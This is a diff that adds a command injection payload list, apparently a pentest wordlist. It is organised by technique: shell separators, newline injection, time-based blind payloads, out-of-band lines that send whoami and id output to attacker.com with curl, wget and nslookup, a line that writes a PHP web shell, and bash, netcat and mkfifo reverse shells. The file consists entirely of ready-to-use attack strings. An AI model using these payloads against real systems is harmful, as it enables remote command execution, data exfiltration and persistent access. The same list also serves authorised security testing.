@@ -1,0 +1,63 @@
+# Command Injection Payloads
+
+# ============ Basic separators ============
+; id
+; id;
+| id
+| id |
+|| id
+|| id ||
+& id
+& id &
+&& id
+&& id &&
+`id`
+$(id)
+$( id )
+
+# ============ Newline injection ============
+%0aid
+%0a id
+%0d%0aid
+\nid
+\n id
+
+# ============ With original command ============
+127.0.0.1; id
+127.0.0.1 | id
+127.0.0.1 || id
+127.0.0.1 & id
+127.0.0.1 && id
+`127.0.0.1`; id
+$(127.0.0.1); id
+
+# ============ Blind command injection (time-based) ============
+; sleep 5
+| sleep 5
+|| sleep 5
+& sleep 5
+&& sleep 5
+`sleep 5`
+$(sleep 5)
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+
+# ============ Blind command injection (OOB) ============
+; curl http://attacker.com/?x=$(whoami)
+; wget http://attacker.com/?x=$(id)
+; nslookup $(whoami).attacker.com
+; ping -c 1 $(whoami).attacker.com
+| curl http://attacker.com/$(whoami)
+`curl http://attacker.com/?x=$(id)`
+$(curl http://attacker.com/?x=$(id))
+
+# ============ Write file ============
+; echo 'test' > /tmp/pwned
+| echo 'test' > /tmp/pwned
+&& echo '<?php system($_GET["c"]); ?>' > shell.php
+
+# ============ Reverse shell ============
+; bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
+| bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
+; nc -e /bin/sh IP PORT
+; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
